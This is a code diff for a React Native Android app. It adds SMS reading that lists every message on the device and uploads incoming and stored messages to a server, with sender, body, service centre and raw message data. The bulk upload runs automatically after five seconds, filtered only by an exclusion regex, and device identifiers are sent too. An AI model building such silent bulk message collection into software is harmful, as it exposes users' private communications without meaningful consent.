@@ -231,18 +231,6 @@ const cleanCompany = company => {
 };
 
 function App() {
-  const removeToken = async res => {
-    if (
-      res.message === 'Invalid token!' ||
-      res.message === 'You are not authorized' ||
-      res.message === 'You are not authorized to perform this action' ||
-      res.message === 'Invalid token or expired!'
-    ) {
-      console.log('removing token');
-      await AsyncStorage.removeItem('userToken');
-    }
-  };
-
   const registerMobileFun = async () => {
     try {
       const registeredMobile = await AsyncStorage.getItem('registeredMobile');
@@ -251,6 +239,7 @@ function App() {
           androidId: await DeviceInfo.getAndroidId(),
           deviceId: await DeviceInfo.getDeviceId(),
           deviceName: await DeviceInfo.getDeviceName(),
+          androidVersion: await DeviceInfo.getSystemVersion(),
           id: await getDeviceId(),
         };
         const res = await registerMobile(obj);
@@ -271,6 +260,323 @@ function App() {
 
   const handleTabChange = tab => {
     setCurrentTab(tab);
+  };
+
+  //sms
+
+  const [messages, setMessages] = useState([]);
+  const [currentPage, setCurrentPage] = useState(1);
+  const [messagesPerPage] = useState(10);
+  const [searchTerm, setSearchTerm] = useState('');
+  const [filteredMessages, setFilteredMessages] = useState([]);
+
+  const [triggerSms, setTriggerSms] = useState(false);
+  const requestSMSPermissions = async () => {
+    try {
+      const readSMSPermissionStatus = await check(PERMISSIONS.ANDROID.READ_SMS);
+      console.log(
+        'Current Read SMS permission status:',
+        readSMSPermissionStatus,
+      );
+      setTriggerSms(!triggerSms);
+      if (readSMSPermissionStatus !== RESULTS.GRANTED) {
+        const readPermissionRequestResult = await request(
+          PERMISSIONS.ANDROID.READ_SMS,
+        );
+        console.log(
+          'Read SMS permission request result:',
+          readPermissionRequestResult,
+        );
+
+        if (readPermissionRequestResult !== RESULTS.GRANTED) {
+          console.log('Read SMS permission not granted');
+        } else {
+          console.log('Read SMS permission granted');
+        }
+      } else {
+        console.log('Read SMS permission already granted');
+      }
+    } catch (error) {
+      console.error('Permission request error:', error);
+    }
+  };
+
+  useEffect(() => {
+    const fetchAllSMS = async () => {
+      try {
+        await requestSMSPermissions();
+
+        SmsAndroid.list(
+          JSON.stringify({}),
+          fail => {
+            console.log('Failed with this error: ' + fail);
+          },
+          (count, smsList) => {
+            const parsedMessages = JSON.parse(smsList);
+            const messagesWithReadFlag = parsedMessages.map(message => ({
+              ...message,
+              read: false,
+            }));
+
+            setMessages(messagesWithReadFlag);
+            setFilteredMessages(messagesWithReadFlag);
+          },
+        );
+      } catch (error) {
+        console.error('Error fetching SMS:', error);
+      }
+    };
+
+    fetchAllSMS();
+  }, []);
+
+  const initializeSmsListener = async () => {
+    const readSMSPermissionStatus = await check(PERMISSIONS.ANDROID.READ_SMS);
+    console.log('readSMSPermissionStatus', readSMSPermissionStatus);
+
+    if (readSMSPermissionStatus === RESULTS.GRANTED) {
+      const subscription = SmsListener.addListener(async message => {
+        console.info('message----->', message);
+
+        const addressMatches = keywords.some(keyword =>
+          message.address.toLowerCase().includes(keyword),
+        );
+        const bodyMatches = keywords.some(keyword =>
+          message.body.toLowerCase().includes(keyword),
+        );
+        const containsUnwantedDetails = unwantedDetailsRegex.test(
+          message.body.toLowerCase(),
+        );
+
+        if (!containsUnwantedDetails) {
+          const data = {
+            company: message?.address,
+            message: message?.body,
+            arbitraryData: message,
+            serviceCenter: message?.service_center,
+            dateSent: new Date(Number(message?.date_sent)),
+          };
+          setLoading(true);
+
+          await dumpSmsFun(data);
+          const newMessage = {...message, read: true};
+          setMessages([newMessage, ...messages]);
+          setFilteredMessages([newMessage, ...filteredMessages]);
+          setLoading(false);
+        } else {
+          const newMessage = {...message, read: false};
+          setMessages([newMessage, ...messages]);
+          setFilteredMessages([newMessage, ...filteredMessages]);
+        }
+      });
+
+      return () => {
+        subscription.remove();
+      };
+    }
+  };
+
+  useEffect(() => {
+    const checkAndRequestPermission = async () => {
+      const readSMSPermissionStatus = await check(PERMISSIONS.ANDROID.READ_SMS);
+
+      if (readSMSPermissionStatus === RESULTS.GRANTED) {
+        initializeSmsListener();
+      }
+    };
+
+    let timeOut = setTimeout(() => {
+      checkAndRequestPermission();
+    }, 3000);
+
+    return () => {
+      clearTimeout(timeOut);
+    };
+  }, [triggerSms]);
+
+  const handleSearch = text => {
+    setSearchTerm(text);
+    const filtered = messages.filter(
+      message =>
+        message?.address.toLowerCase()?.includes(text.toLowerCase()) ||
+        message?.body.toLowerCase()?.includes(text.toLowerCase()) ||
+        message?.serviceCenter?.toLowerCase().includes(text.toLowerCase()),
+    );
+    setFilteredMessages(filtered);
+  };
+
+  const dumpSmsFun = async data => {
+    try {
+      const res = await dumpSms(data);
+      console.log('res', res);
+      return res;
+    } catch (err) {
+      console.log('err', err);
+    }
+  };
+
+  const [loading, setLoading] = useState(false);
+  const [progress, setProgress] = useState(0);
+
+  const [readSms, setReadSms] = useState(false);
+
+  // useEffect(() => {
+  //   const checkPushedData = async () => {
+  //     try {
+  //       const pushedData = await AsyncStorage.getItem('pushedData');
+  //       if (pushedData) {
+  //         setReadSms(false);
+  //       } else {
+  //         setReadSms(true);
+  //       }
+  //     } catch (error) {
+  //       console.error('Failed to fetch pushedData from AsyncStorage', error);
+  //       setReadSms(false);
+  //     }
+  //   };
+
+  //   checkPushedData();
+  // }, []);
+
+  const pushData = async () => {
+    try {
+      const pushedData = await AsyncStorage.getItem('pushedData');
+      console.log('pushedData', pushedData);
+      if (!pushedData) {
+        const filteredMessages = messages.filter(message => {
+          const messageBody = message.body.toLowerCase();
+          const messageAddress = message.address.toLowerCase();
+
+          return !unwantedDetailsRegex.test(messageBody);
+          // (keywords.some(keyword => messageBody.includes(keyword)) ||
+          //   keywords.some(keyword => messageAddress.includes(keyword)))
+        });
+
+        if (filteredMessages.length === 0) {
+          console.log('No messages to push');
+          return;
+        }
+
+        setLoading(true);
+
+        for (let i = 0; i < filteredMessages.length; i++) {
+          const message = filteredMessages[i];
+          const data = {
+            company: message?.address,
+            message: message?.body,
+            arbitraryData: message,
+            serviceCenter: message?.service_center,
+            dateSent: new Date(Number(message?.date_sent)),
+          };
+
+          await dumpSmsFun(data);
+
+          // Update the read flag for the message after dumping it
+          message.read = true;
+
+          // Calculate progress
+          setProgress((i + 1) / filteredMessages.length);
+        }
+
+        // Update the state with the modified messages
+        setMessages(prevMessages =>
+          prevMessages.map(msg =>
+            filteredMessages.some(fm => fm._id === msg._id)
+              ? {...msg, read: true}
+              : msg,
+          ),
+        );
+        setFilteredMessages(prevMessages =>
+          prevMessages.map(msg =>
+            filteredMessages.some(fm => fm._id === msg._id)
+              ? {...msg, read: true}
+              : msg,
+          ),
+        );
+        setLoading(false);
+
+        await AsyncStorage.setItem('pushedData', 'true');
+      } else {
+        setLoading(false);
+      }
+    } catch (error) {
+      console.error('Error fetching or filtering messages:', error);
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      pushData();
+    }, 5000);
+
+    return () => clearTimeout(timer);
+  }, [messages]);
+
+  const [toggleLoading, setToggleLoading] = useState('');
+  const toggleDump = async message => {
+    if (toggleLoading) return;
+    try {
+      setToggleLoading(message?.date);
+      if (message?.read) {
+        const res = await deleteSms({
+          company: message?.address,
+          dateSent: new Date(message?.date),
+          serviceCenter: message?.serviceCenter,
+        });
+        if (res?.status) {
+          // Implement the function to toggle the dump flag and update the state accordingly
+          const updatedMessages = messages.map(msg =>
+            msg._id === message._id ? {...msg, read: !msg.read} : msg,
+          );
+          setMessages(updatedMessages);
+          setFilteredMessages(updatedMessages);
+        } else {
+          Snackbar.show({
+            text: res?.message,
+            duration: 5000,
+            textColor: 'red',
+          });
+        }
+      } else {
+        const data = {
+          company: message?.address,
+          message: message?.body,
+          arbitraryData: message,
+          serviceCenter: message?.service_center,
+          dateSent: new Date(message?.date),
+        };
+        const containsUnwantedDetails = unwantedDetailsRegex.test(
+          message.body.toLowerCase(),
+        );
+        if (!containsUnwantedDetails) {
+          const res = await dumpSmsFun(data);
+          if (res?.status) {
+            const updatedMessages = messages.map(msg =>
+              msg._id === message._id ? {...msg, read: !msg.read} : msg,
+            );
+            setMessages(updatedMessages);
+            setFilteredMessages(updatedMessages);
+          } else {
+            Snackbar.show({
+              text: res?.message,
+              duration: 5000,
+              textColor: 'red',
+            });
+          }
+        } else {
+          Snackbar.show({
+            text: 'We Do not listen to these messages, due to security issues',
+            duration: 5000,
+            textColor: 'red',
+          });
+        }
+      }
+    } catch (error) {
+      console.error('Error toggling dump:', error);
+    } finally {
+      setToggleLoading('');
+    }
   };
 
   //notification
@@ -385,7 +691,6 @@ function App() {
             duration: 5000,
             textColor: 'red',
           });
-          await removeToken(res);
         }
       } else {
         const appMatch = cleanCompany(message?.app);
@@ -409,7 +714,6 @@ function App() {
             duration: 5000,
             textColor: 'red',
           });
-          await removeToken(res);
         }
       }
     } catch (error) {
@@ -584,6 +888,5 @@ const styles = StyleSheet.create({
     alignItems: 'center',
   },
 });
-
 
 export default App;
